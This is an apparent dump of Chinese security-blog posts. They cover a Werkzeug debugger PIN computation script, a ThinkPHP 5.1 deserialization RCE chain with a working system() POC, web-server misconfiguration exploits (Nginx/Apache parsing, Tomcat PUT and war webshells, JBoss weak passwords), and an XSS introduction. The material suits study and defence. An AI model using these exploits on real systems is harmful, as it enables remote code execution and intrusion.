\u0026#39;cool\u0026#39;,# username \u0026#39;flask.app\u0026#39;,# modname \u0026#39;Flask\u0026#39;,# getattr(app, \u0026#39;__name__\u0026#39;, getattr(app.__class__, \u0026#39;__name__\u0026#39;)) \u0026#39;/home/cool/.local/lib/python3.9/site-packages/flask/app.py\u0026#39;,# getattr(mod, \u0026#39;__file__\u0026#39;, None) ] private_bits = [\u0026#39;52242275645\u0026#39;, \u0026#39;cdb9fdddb45e4f95b043309c818c3ff5\u0026#39;] # 第一个元素：str(uuid.getnode()), /sys/class/net/eth0/address # 第二个元素：get_machine_id(), /etc/machine-id h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\u0026#34;utf-8\u0026#34;) h.update(bit) h.update(b\u0026#34;cookiesalt\u0026#34;) cookie_name = f\u0026#34;__wzd{h.hexdigest()[:20]}\u0026#34; num = None if num is None: h.update(b\u0026#34;pinsalt\u0026#34;) num = f\u0026#34;{int(h.hexdigest(), 16):09d}\u0026#34;[:9] rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#34;-\u0026#34;.join( num[x : x + group_size].rjust(group_size, \u0026#34;0\u0026#34;) for x in range(0, len(num), group_size) ) break else: rv = num print(rv) 脚本中各参数的获取方法：\n username  当前运行Flask应用的用户名，可读取/etc/passwd获取\n modname  一般默认\n appname  一般默认\n 路径  通过报错获取：\n\r\n 网络地址  读取/sys/class/net/eth0/address，并进行进制转换：\n\r\nint(\u0026quot;00:0c:29:e1:dd:3d\u0026quot;.replace(\u0026quot;:\u0026quot;, \u0026quot;\u0026quot;), 16)\r\r\n 机器码  默认生成方式为先依次读取/etc/machine-id和/proc/sys/kernel/random/boot_id，读到其中一个则退出，继续读取/proc/self/cgroup中第一行中以最右侧/分割的右边部分内容，最后将两部分进行拼接得到机器码。\n 不同版本中机器码的生成方式有区别\n 执行脚本：\n\r\n\r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/ssti/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/ssti/","title":"SSTI 相关"},{"content":"thinkphp5.1.* - 反序列化 环境 thinkphp-5.1.37\nPHP 7.0.33\n反序列化触发链  全局搜索__destruct()关键字，找到漏洞的起点：  \r\n 跟进removeFiles()  \r\n发现$this-\u0026gt;files变量，而该removeFiles函数的功能就是删除文件，因此只要有反序列化点，就可实现任意文件删除，POC如下：\n\u0026lt;?php namespace think\\process\\pipes; abstract class Pipes { } class Windows extends Pipes { private $files = [\u0026#34;test.txt\u0026#34;]; } echo base64_encode(serialize(new Windows())); ?\u0026gt; removeFiles()中使用了file_exists对$filename进行处理。file_exists函数种$filename会被作为字符串处理，那么如果filename是某个类对象，就会触发__toString方法。 全局搜索__toString，发现Conversion类种存在如下:  \r\n 跟进toJson()：  /**\r* 转换当前模型对象为JSON字符串\r* @access public\r* @param integer $options json参数\r* @return string\r*/\rpublic function toJson($options = JSON_UNESCAPED_UNICODE)\r{\rreturn json_encode($this-\u0026gt;toArray(), $options);\r}\r 跟进toArray():  /** * 转换当前模型对象为数组 * @access public * @return array */ public function toArray() { .... // 追加属性（必须定义获取器）  if (!empty($this-\u0026gt;append)) { foreach ($this-\u0026gt;append as $key =\u0026gt; $name) { if (is_array($name)) { // 追加关联对象属性  $relation = $this-\u0026gt;getRelation($key); if (!$relation) { $relation = $this-\u0026gt;getAttr($key); if ($relation) { $relation-\u0026gt;visible($name); } } $item[$key] = $relation ? $relation-\u0026gt;append($name)-\u0026gt;toArray() : []; } elseif (strpos($name, \u0026#39;.\u0026#39;)) { list($key, $attr) = explode(\u0026#39;.\u0026#39;, $name); // 追加关联对象属性  $relation = $this-\u0026gt;getRelation($key); if (!$relation) { $relation = $this-\u0026gt;getAttr($key); if ($relation) { $relation-\u0026gt;visible([$attr]); } } $item[$key] = $relation ? $relation-\u0026gt;append([$attr])-\u0026gt;toArray() : []; } else { $item[$name] = $this-\u0026gt;getAttr($name, $item); } } } return $item; } 注意到了$relation-\u0026gt;visible($name)，调用$relation变量的visible方法，参数为$name，而name是从$this-\u0026gt;append取出来的，而$this-\u0026gt;append我们可以通过自定义属性进行控制，那么name就可控，当$relation也可控的话，令其为某个类对象，当调用visible方法不存在时，则会触发该类对象的__call方法。\n接下来就是寻找如何控制$relation。\n 跟进$this-\u0026gt;getRelation:  /** * 获取当前模型的关联模型数据 * @access public * @param string $name 关联方法名 * @return mixed */ public function getRelation($name = null) { if (is_null($name)) { return $this-\u0026gt;relation; } elseif (array_key_exists($name, $this-\u0026gt;relation)) { return $this-\u0026gt;relation[$name]; } return; } 发现可以直接return，而且后续判断语句为if (!$relation)，所以可继续跟进。\n 跟进$this-\u0026gt;getAttr，进入Attribute类:  /** * 获取器 获取数据对象的值 * @access public * @param string $name 名称 * @param array $item 数据 * @return mixed * @throws InvalidArgumentException */ public function getAttr($name, \u0026amp;$item = null) { try { $notFound = false; $value = $this-\u0026gt;getData($name); } catch (InvalidArgumentException $e) { $notFound = true; $value = null; } ... return $value; }  返回值由$this-\u0026gt;getData确定，跟进该方法：  /** * 获取对象原始数据 如果不存在指定字段返回false * @access public * @param string $name 字段名 留空获取全部 * @return mixed * @throws InvalidArgumentException */ public function getData($name = null) { if (is_null($name)) { return $this-\u0026gt;data; } elseif (array_key_exists($name, $this-\u0026gt;data)) { return $this-\u0026gt;data[$name]; } elseif (array_key_exists($name, $this-\u0026gt;relation)) { return $this-\u0026gt;relation[$name]; } throw new InvalidArgumentException(\u0026#39;property not exists:\u0026#39; . static::class . \u0026#39;-\u0026gt;\u0026#39; . $name); } 发现：其值可以由$this-\u0026gt;data[$name]确定，那么我们可以控制Attribute类属性data值，且$this-\u0026gt;data[$name]的键name是由最初append中的key决定的，也是我们可控的，所以我们可以控制$relation。\n 梳理反序列化触发链：  # Windwos类\r__dustruct \u0026gt; removeFiles() \u0026gt; file_exists($filename) \u0026gt; $filename可控 触发__toString()\r# Conversion类\r__toString() \u0026gt; toJson() \u0026gt; toArray() \u0026gt; $relation-\u0026gt;visible($name) \u0026gt; $relation可控和$name可控 触发__call()\r# $name可控\r从Conversion类的append属性中读取，所以可控\r# $relation可控\rAttribute类中getAttr($key) \u0026gt; getData($name) \u0026gt; $data[$name]\r其中data为Attribute类属性，键$name可由append控制，所以可控\r 发现Conversion和Attribute为trait类：\n自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。\ntrait类不能实例化，所以要找一个同时继承Attribute类和Conversion类的子类。\n  全局搜索Attribute，找到了Model类：  \r\n 总计目前的利用POC：  namespace think; abstract class Model{ protected $append = []; private $data = []; function __construct(){ $this-\u0026gt;append = [\u0026#34;haha\u0026#34;=\u0026gt;[]]; $this-\u0026gt;data = [\u0026#34;haha\u0026#34;=\u0026gt;new A()]; } } 接下来就是寻找A类，该类要么是存在visible方法且里面有敏感函数可以直接让我们利用，要么就是没有visible方法但存在__call()方法可让我们利用。\n敏感函数执行链   全局搜索visible，发现没有什么可利用的。\n  全局搜索__call()：\n  \r\n最终在Request.php中找到一个__call方法，且其中存在call_user_func_array，且参数$this-\u0026gt;hook是可控的，$args也是我们可控的(之前的反序列化触发链)。但是array_unshift会在$args头中插入$this，导致无法构造任意内容。\n因此，要找到另一个函数，让它被这里的call_user_func_array调用，但是它对所需的参数无严格要求，且最终也能触发敏感函数。\nthinkphp中有多个远程代码执行洞都有一个filter覆盖的问题，所以尝试从这里入手。\n 找filterValue：  /** * 递归过滤给定的值 * @access public * @param mixed $value 键值 * @param mixed $key 键名 * @param array $filters 过滤方法+默认值 * @return mixed */ private function filterValue(\u0026amp;$value, $key, $filters) { $default = array_pop($filters); foreach ($filters as $filter) { if (is_callable($filter)) { // 调用函数或者方法过滤  $value = call_user_func($filter, $value); } elseif (is_scalar($value)) { .... } return $value; } 存在call_user_func敏感函数，往上找看$filters和$$value是否可控。\n 找到input：  /** * 获取变量 支持过滤和默认值 * @access public * @param array $data 数据源 * @param string|false $name 字段名 * @param mixed $default 默认值 * @param string|array $filter 过滤函数 * @return mixed */ public function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { if (false === $name) { // 获取原始数据  return $data; } if (\u0026#39;\u0026#39; != $name) { // 解析name  if (strpos($name, \u0026#39;/\u0026#39;)) { list($name, $type) = explode(\u0026#39;/\u0026#39;, $name); } $data = $this-\u0026gt;getData($data, $name); if (is_null($data)) { return $default; } if (is_object($data)) { return $data; } } // 解析过滤器  $filter = $this-\u0026gt;getFilter($filter, $default); if (is_array($data)) { array_walk_recursive($data, [$this, \u0026#39;filterValue\u0026#39;], $filter); if (version_compare(PHP_VERSION, \u0026#39;7.1.0\u0026#39;, \u0026#39;\u0026lt;\u0026#39;)) { // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针  $this-\u0026gt;arrayReset($data); } } else { $this-\u0026gt;filterValue($data, $name, $filter); } .... return $data; } 会调用filterValue，需要继续往上找，看$filter、$data和$name能否可控。\n 找到param:  /** * 获取当前请求的参数 * @access public * @param mixed $name 变量名 * @param mixed $default 默认值 * @param string|array $filter 过滤方法 * @return mixed */ public function param($name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { ... if (true === $name) { // 获取包含文件上传信息的数组  $file = $this-\u0026gt;file(); $data = is_array($file) ? array_merge($this-\u0026gt;param, $file) : $this-\u0026gt;param; return $this-\u0026gt;input($data, \u0026#39;\u0026#39;, $default, $filter); } return $this-\u0026gt;input($this-\u0026gt;param, $name, $default, $filter); } 会调用input，发现$this-\u0026gt;param我们是可控的，但是$filter和$name不明确，继续往上找。\n 找到isAjax：  /** * 当前是否Ajax请求 * @access public * @param bool $ajax true 获取原始ajax请求 * @return bool */ public function isAjax($ajax = false) { $value = $this-\u0026gt;server(\u0026#39;HTTP_X_REQUESTED_WITH\u0026#39;); $result = \u0026#39;xmlhttprequest\u0026#39; == strtolower($value) ? true : false; if (true === $ajax) { return $result; } $result = $this-\u0026gt;param($this-\u0026gt;config[\u0026#39;var_ajax\u0026#39;]) ? true : $result; $this-\u0026gt;mergeParam = false; return $result; } 会调用param，且通过$this-\u0026gt;config['var_ajax']给param函数的$name参数赋值，且$this-\u0026gt;config['var_ajax']我们可控，分析一下赋值后的执行流程：\n在param函数中name参数被赋值后且不是true，会调用$this-\u0026gt;input($this-\u0026gt;param, $name, $default, $filter);，即input函数第二个参数name被赋值且第一个参数$this-\u0026gt;param我们可控；在input函数中存在如下调用：\n$data = $this-\u0026gt;getData($data, $name); $filter = $this-\u0026gt;getFilter($filter, $default); $this-\u0026gt;filterValue($data, $name, $filter);  跟进getData:  /** * 获取数据 * @access public * @param array $data 数据源 * @param string|false $name 字段名 * @return mixed */ protected function getData(array $data, $name) { foreach (explode(\u0026#39;.\u0026#39;, $name) as $val) { if (isset($data[$val])) { $data = $data[$val]; } else { return; } } return $data; } 该函数的$data参数是由$this-\u0026gt;param可控，$name参数来自于$this-\u0026gt;config['var_ajax']，返回值是这样进行赋值$data = $data[$val]，即最终的返回值我们可控，也就是input函数中的$data可控，那么$this-\u0026gt;filterValue函数的data参数也就可控，现在就差$filter是否可控。\n 跟进getFilter:  protected function getFilter($filter, $default) { if (is_null($filter)) { $filter = []; } else { $filter = $filter ?: $this-\u0026gt;filter; if (is_string($filter) \u0026amp;\u0026amp; false === strpos($filter, \u0026#39;/\u0026#39;)) { $filter = explode(\u0026#39;,\u0026#39;, $filter); } else { $filter = (array) $filter; } } $filter[] = $default; return $filter; } 发现返回的filter值来自于$this-\u0026gt;filter，也就是可控的。\n 综上，对于filterValue函数来说，其参数value可控，filter可控，那么其中所调用的call_user_func($filter, $value)也就完全可控。从而执行恶意代码。   过程中提到input函数中$this-\u0026gt;param这个值，虽然我们可以通过类属性控制它，但是发现可以在GET请求中加入参数对其进行赋值，进行个简单测试：\n\u0026lt;?php\rnamespace app\\index\\controller;\ruse think\\Request;\rclass Index\r{\rpublic function index(Request $request)\r{\rvar_dump($request-\u0026gt;param());\rreturn 'haha';\r}\rpublic function hello($name = 'ThinkPHP5')\r{\rreturn 'hello,' . $name;\r}\r}\r\r\n  梳理执行链：  # Model类__call方法，令$this-\u0026gt;hook = [\u0026#34;visible\u0026#34;=\u0026gt;[$this,\u0026#34;isAjax\u0026#34;]]；调用this-\u0026gt;isAjax方法，经上面分析，this-\u0026gt;isAjax方法对参数无要求，所以哪怕在$args头插入this也无所谓了。 public function __call($method, $args) { if (array_key_exists($method, $this-\u0026gt;hook)) { array_unshift($args, $this); return call_user_func_array($this-\u0026gt;hook[$method], $args); } } # 触发调用isAjax函数，令$this-\u0026gt;config[\u0026#39;var_ajax\u0026#39;]=\u0026#39;haha\u0026#39; public function isAjax($ajax = false) { $result = $this-\u0026gt;param($this-\u0026gt;config[\u0026#39;var_ajax\u0026#39;]) ? true : $result; } # 调用param函数，name=$this-\u0026gt;config[\u0026#39;var_ajax\u0026#39;]=\u0026#39;haha\u0026#39;;$this-\u0026gt;param为GET请求传入的参数;filter暂时未知 public function param($name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { return $this-\u0026gt;input($this-\u0026gt;param, $name, $default, $filter); } # 调用input函数，data=外部传入，{[\u0026#39;haha\u0026#39;]=\u0026gt;\u0026#39;ls\u0026#39;};name=$this-\u0026gt;config[\u0026#39;var_ajax\u0026#39;]=\u0026#39;haha\u0026#39;;filter经过$this-\u0026gt;getFilter($filter, $default)函数是filter=[0=\u0026gt;\u0026#39;system\u0026#39;,1=\u0026gt;$default]； public function input($data = [], $name = \u0026#39;\u0026#39;, $default = null, $filter = \u0026#39;\u0026#39;) { $data = $this-\u0026gt;getData($data, $name); $filter = $this-\u0026gt;getFilter($filter, $default);// 经过该函数filter=[0=\u0026gt;\u0026#39;system\u0026#39;,1=\u0026gt;$default]  if (is_array($data)) {// data通过getData函数后不再是数组，data=’ls‘  array_walk_recursive($data, [$this, \u0026#39;filterValue\u0026#39;], $filter); if (version_compare(PHP_VERSION, \u0026#39;7.1.0\u0026#39;, \u0026#39;\u0026lt;\u0026#39;)) { $this-\u0026gt;arrayReset($data); } } else { $this-\u0026gt;filterValue($data, $name, $filter); } } # 调用filterValue函数，value=’ls‘;key=’haha‘这个函数里最后没用到；filters=[0=\u0026gt;\u0026#39;system\u0026#39;,1=\u0026gt;$default] private function filterValue(\u0026amp;$value, $key, $filters) { $default = array_pop($filters);//[0=\u0026gt;\u0026#39;system\u0026#39;,1=\u0026gt;$default]pop完之后，filters=[0=\u0026gt;\u0026#39;system\u0026#39;]  foreach ($filters as $filter) { if (is_callable($filter)) { $value = call_user_func($filter, $value); } } } # 调用call_user_func，filter=’system‘,value=\u0026#39;ls\u0026#39; POC Model是一个抽象类，想要实例化，必须找到一个它的实现类，全局搜索extends Model，找到Pivot类：\n\r\n\u0026lt;?php namespace think; abstract class Model{ protected $append = []; private $data = []; function __construct(){ $this-\u0026gt;append = [\u0026#34;haha\u0026#34;=\u0026gt;[]]; $this-\u0026gt;data = [\u0026#34;haha\u0026#34;=\u0026gt;new Request()]; } } class Request { protected $hook = []; protected $filter = \u0026#34;system\u0026#34;; protected $config = [ \u0026#39;var_ajax\u0026#39; =\u0026gt; \u0026#39;haha\u0026#39;, ]; function __construct(){ $this-\u0026gt;filter = \u0026#34;system\u0026#34;; $this-\u0026gt;hook = [\u0026#34;visible\u0026#34;=\u0026gt;[$this,\u0026#34;isAjax\u0026#34;]]; } } namespace think\\process\\pipes; use think\\model\\concern\\Conversion; use think\\model\\Pivot; class Windows { private $files = []; public function __construct() { $this-\u0026gt;files=[new Pivot()]; } } namespace think\\model; use think\\Model; class Pivot extends Model { } use think\\process\\pipes\\Windows; echo base64_encode(serialize(new Windows())); ?\u0026gt;测试页代码构造一个反序列化入口：\npublic function index() { $test = $_POST[\u0026#39;cmd\u0026#39;]; unserialize(base64_decode($test)); return \u0026#39;haha\u0026#39;; } 利用：\n\r\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/php-5/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/php-5/","title":"thinkphp5.1.* - 反序列化"},{"content":"Web容器安全 简介  Web中间件  提供系统软件与应用软件之间连接的软件。他处在操作系统和更高一级应用程序之间，他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。\n Web容器  容器是中间件的一种，它给处于其中的应用程序组件提供从一个环境，使应用程序直接与容器中的环境变量进行交互而不必关注其他的系统问题。\n Web服务器  提供 Web 服务器的软件或主机，即 Web 服务器软件或者装有 Web 服务器软件的计算机。\nApache Apache配置缺陷  AddHandler application/x-httpd-php .php配置为相应的文件扩展名指定处理程序，表明将扩展名为 .php 的文件交给 x-httpd-php 程序处理 Apache识别文件扩展名顺序是从后往前，当遇到无法识别和处理的扩展名，则会接着往前识别，直到遇到第一个可以识别并处理的扩展名  那么在以上两个配置下，可以通过上传xxx.php.png的文件来绕过文件上传中的白名单机制等等。\n复现   conf文件配置\rimage-20220227220257782\r\n  .htaccess文件配置\n  \r\n 访问http://192.168.66.55/phpinfo.php.png  \r\nApache换行解析漏洞 CVE-2017-15715\n影响：Apache 2.4.10 - 2.4.29\n原理 在解析文件时，遇到.php\\x0a会按照php后缀进行解析，从而绕过一些安全策略限制，比如文件上传中的白名单。\n\r\n复现 \r\n后端使用白名单对后缀进行校验。\n在hex中加入0a尝试绕过：\n\r\n发现成功上传，访问结果如下：\n\r\nNginx Nginx (engine x) 是一个高性能的HTTP和反向代理Web服务器，同时也提供了IMAP/POP3/SMTP服务。\nNginx配置缺陷 CRLF注入 攻击者向请求行或首部字段注入恶意CRLF和一些响应首部字段或报文主体，且改字段会在响应头中添加，那么在解析时就会误认为在响应头添加了新的首部字段，又称为HTTP响应拆分漏洞。\n在Nginx配置中，可以接收URL的变量有：\n $URI：获取解码后的请求路径 $DOCUMENT_URI：与$URI相同 $REQUEST_URI：未解码的完整URL  原理：\nNginx中错误的配置：\n# 原本是希望http请求跳转到https\rlocation / {\rreturn 302 https://$host$uri;\r}\r那么在url中引入%0d%0a和其他内容，则会发生注入。\n复现：\n\r\n目录穿越 Nginx 在配置别名（Alias）的时候，如果忘记加 /，将造成一个目录穿越漏洞。\n错误的配置：\n# 原本的目的是为了让用户访问到 /home/ 目录下的文件\rlocation /files {\ralias /home/;\r}\r那么访问http://your-ip:8081/files../可穿越到根目录：\n\r\nNginx 越界读取缓存 CVE-2017-7529\n影响版本：Nginx 0.5.6 - 1.13.2\n原理 HTTP Range头：\nHTTP 的 Range，允许客户端分批次请求资源的部分，如果服务端资源较大，可以通过 Range 来并发下载；如果访问资源时网络中断，可以断点续传。Range 设置在 HTTP 请求头中，它是多个 byte-range-spec(或 suffix-range-byte-spec)的集合。\nRange：bytes=0-1024 表示访问第 0 到第 1024 字节\rRange：bytes=500-600，601-999，-300 表示分三块访问，分别是 500 到 600 字节，601 到 600 字节，最后的 300 字节\rCache：\nNginx作为反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的HTTP返回包体返回给用户。\n如果请求中包含Range头，Nginx将会根据指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。\n复现 \r\n成功越界读取文件头、HTTP返回包头\nNginx 文件名逻辑漏洞 CVE-2013-4547\n影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7\n危害：绕过文件上传、绕过目录限制\nFastCGI Nginx不支持对外部动态程序的直接调用或者解析，所有的外部程序（包括PHP）必须通过FastCGI接口来调用。FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）。为了调用CGI程序，还需要一个FastCGI的wrapper，这个wrapper绑定在某个固定socket上，如端口或者文件socket。当Nginx将CGI请求发送给这个socket的时候，通过FastCGI接口，wrapper接收到请求，然后派生出一个新的线程，这个线程调用解释器或者外部程序处理脚本并读取返回数据；接着，wrapper再将返回的数据通过FastCGI接口，沿着固定的socket传递给Nginx；最后，Nginx将返回的数据发送给客户端，这就是Nginx+FastCGI的整个运作过程。\nFastCGI的主要优点是把动态语言和HTTP服务器分离开来，是Nginx专一处理静态请求和向后转发动态请求，而PHP/PHP-FPM服务器专一解析PHP动态请求。\n原理 非法字符空格和截止符 \\0 会导致 Nginx 解析 URI 时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。\n假设服务器上存在文件：file.aaa[空格]，注意文件名的最后一个字符是空格。则可以通过访问：http://127.0.0.1/file.aaa \\0.bbb，让 Nginx 认为文件 file.aaa的后缀为 .bbb。\n绕过文件上传-复现 漏洞利用条件：\n  Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7\n  php-fpm.conf 中的 security.limit_extensions 为空，也就是说任意后缀名都可以解析为 PHP\n  Nginx 匹配到 .php 结尾的请求，就发送给 fastcgi 进行解析，一般写法如下：\nlocation ~ \\.php$ {\rinclude fastcgi_params;\rfastcgi_pass 127.0.0.1:9000;\rfastcgi_index index.php;\rfastcgi_param SCRIPT_FILENAME /var/www/html$fastcgi_script_name;\rfastcgi_param DOCUMENT_ROOT /var/www/html;\r}\r正常情况下（关闭 pathinfo 的情况下），只有 .php 后缀的文件才会被发送给 fastcgi 解析。\n而在 CVE-2013-4547 的情况下，请求 1.gif[0x20][0x00].php，这个 URI 可以匹配正则 \\.php$，可以进入这个 Location 块；但进入后Nginx 却错误地认为请求的文件是 1.gif[0x20]，就设置其为 SCRIPT_FILENAME 的值发送给 fastcgi。\nfastcgi 根据 SCRIPT_FILENAME 的值进行解析，最后造成了解析漏洞。\n所以，我们只需要上传一个空格结尾的文件，即可使 PHP 解析之。\n环境中是黑名单验证，这里借助该漏洞上传phpinfo.png，让其以PHP进行解析：\n\r\n\r\n绕过目录限制 限制访问后台IP：\nlocation /admin/ {\rallow 127.0.0.1;\rdeny all;\r}\r通过请求如下 URI：/test[0x20]/../admin/index.php，这个 URI 不会匹配上 location 后面的 /admin/，也就绕过了其中的 IP 验证\n但最后请求的是 /test[0x20]/../admin/index.php 文件，也就是 /admin/index.php，成功访问到后台。\n 注意：\n前提是需要有一个目录叫 test ：这是 Linux 系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会报文件不存在的错误， Windows 下没有这个限制\n Nginx 解析漏洞 该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。\n原理   nginx 把以 .php 结尾的文件交给 fastcgi 处理,为此可以构造 http://ip/uploadfiles/test.png/.php，其中 test.png 是上传的包含 PHP 代码的图片文件。\n  fastcgi 在处理 .php 文件时发现文件并不存在，这时 php.ini 配置文件中 cgi.fix_pathinfo=1 发挥作用，这项配置用于修复路径，如果当前路径不存在则采用上层路径。为此这里交由 fastcgi 处理的文件就变成了 /test.png。\n  最重要的一点是 php-fpm.conf 中的 security.limit_extensions 配置项限制了 fastcgi 解析文件的类型(即指定什么类型的文件当做代码解析)，此项设置为空的时候才允许 fastcgi 将 .png 等文件当做代码解析。\n  复现 访问http://ip/test.png/.php直接可以php文件解析。\nTomcat Tomcat 是 Apache 软件基金会的 Jakarta 项目中的一个核心项目，由 Apache、Sun 和其他一些公司及个人共同开发而成。\nTomcat 服务器是一个免费的开放源代码的 Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。\n实际上 Tomcat 是 Apache 服务器的扩展，但运行时它是独立运行的，所以当你运行 Tomcat 时，它实际上作为一个与 Apache 独立的进程单独运行的。\nTomcat 配置缺陷 CVE-2017-12615\n影响版本：Apahce Tomcat 7.0.0 - 7.0.79\n原理 当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法，攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。\nTomcat 配置了可写（readonly=false），导致可以往服务器写文件：\n\u0026lt;servlet\u0026gt;\r\u0026lt;servlet-name\u0026gt;default\u0026lt;/servlet-name\u0026gt;\r\u0026lt;servlet-class\u0026gt;org.apache.catalina.servlets.DefaultServlet\u0026lt;/servlet-class\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;debug\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;0\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;listings\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;init-param\u0026gt;\r\u0026lt;param-name\u0026gt;readonly\u0026lt;/param-name\u0026gt;\r\u0026lt;param-value\u0026gt;false\u0026lt;/param-value\u0026gt;\r\u0026lt;/init-param\u0026gt;\r\u0026lt;load-on-startup\u0026gt;1\u0026lt;/load-on-startup\u0026gt;\r\u0026lt;/servlet\u0026gt;\rTomcat对文件后缀有限制，无法直接写JSP文件，但是可以利用Windows和Linux的一些特性去写，例如：\n Windows：PUT /test.jsp%20、PUT /test.jsp::$DATA、PUT /test.jsp/ Linux：PUT /test.jsp/  写入shell后直接连接即可。\nTomcat 弱口令 + war 包部署 Tomcat 支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。但是想要访问后台，需要对应用户有相应权限。\nTomcat 权限  manager（后台管理）  manager-gui 拥有 html 页面权限 manager-status 拥有查看 status 的权限 manager-script 拥有 text 接口的权限，和 status 权限 manager-jmx 拥有 jmx 权限，和 status 权限   host-manager（虚拟主机管理）  admin-gui 拥有 html 页面权限 admin-script 拥有 text 接口权限    可以在conf/tomcat-users.xml中配置用户权限：\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;tomcat-users xmlns=\u0026#34;http://tomcat.apache.org/xml\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://tomcat.apache.org/xml tomcat-users.xsd\u0026#34; version=\u0026#34;1.0\u0026#34;\u0026gt; \u0026lt;role rolename=\u0026#34;manager-gui\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;manager-script\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;manager-jmx\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;manager-status\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;admin-gui\u0026#34;/\u0026gt; \u0026lt;role rolename=\u0026#34;admin-script\u0026#34;/\u0026gt; \u0026lt;user username=\u0026#34;tomcat\u0026#34; password=\u0026#34;tomcat\u0026#34; roles=\u0026#34;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script\u0026#34; /\u0026gt; \u0026lt;/tomcat-users\u0026gt; 如若用户采用上述配置，即tomcat用户拥有所有权限，且密码是弱口令。正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。\n复现 以弱密码进入：\n\r\n进入后台：\n\r\n打包war：\njar cvf shell.war ./shell.jsp\r\r\n上传连接测试：\n\r\nJboss jBoss 是 J2EE 环境中一个流行的 Web 容器，但是 jBoss 在默认安装时提供的一些功能却不 太安全，如果配置不得当，则可能直接造成远程命令执行。\n默认端口在8080，常见的Jboss弱口令如下：\nadmin/admin\rjboss/admin\radmin/jboss\radmin/123456\radmin/password\r控制台getshell 控制台地址  Joss4.x及其之前：console 管理路径为 /jmx-console/ 和 /web-console/ jboss5.x / 6.x ：Jboss5.x开始弃用了 web-console，console 管理路径为/jmx-console/ 和 /admin-console/  console的配置文件地址不同网站一般会不同。\n利用  Jboss4.x的jmx-console管理后台存在未授权，可以直接访问上传war包getshell\n5.x开始只有admin-console才可部署war包，且进入后台需要口令认证\n 待更\n反序列化-CVE-2017-12149 待更\n反序列化-CVE-2017-7504 待更\nJBoss JMXInvokerServlet 反序列化漏洞 待更\n","date":"2020-10-09T00:00:00Z","image":"https://coollllllll.github.io/p/web-2/pawel-czerwinski-8uZPynIu-rQ-unsplash.jpg","permalink":"https://coollllllll.github.io/p/web-2/","title":"Web 容器安全"},{"content":"XSS漏洞 定义和分类 XSS(跨站脚本攻击)，指攻击者构造恶意输入并插入网页，使得在客户端执行恶意代码，对用户造成危害。\n可分为三类：\n 反射型 存储型 DOM型  危害  盗取用户cookie 键盘记录 通过钓鱼盗取用户账户 广告引流 恶意软件或木马下载 联动CSRF产生更大危害  反射型XSS 原理 应用程序对用户的输入未经过滤或其他处理，直接输出至HTML页面，则攻击者可以在漏洞发生的位置构造好恶意代码，发送链接至用户，用户点击后产生危害。\n特点  非持久化，只有本地用户受影响 必须发送至其他用户并点击才会产生实际影响  存储型XSS 原理 用户提交的数据会被存储至后端，例如数据库，随后再通过读取数据库内容返回至前端页面。因此，攻击者可提交XSS代码用以存储，随后当读出数据并返回时会影响所有看到该页面的用户。\n场景  留言板、评论区 用户头像、用户名字、个性签名 系统通知 ..  DOM型XSS DOM 